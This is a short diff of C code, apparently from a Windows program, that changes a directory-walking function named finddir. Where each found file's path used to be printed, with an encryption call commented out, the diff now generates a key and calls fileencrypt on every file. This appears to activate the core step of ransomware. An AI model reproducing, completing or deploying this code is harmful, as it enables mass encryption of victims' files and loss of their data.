@@ -80,8 +80,7 @@ void finddir(unsigned char * path, unsigned char * mask) {
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
     generatekey();
-	printf("%s;\n", pathfile);
-	//fileencrypt(pathfile);
+    fileencrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
  }
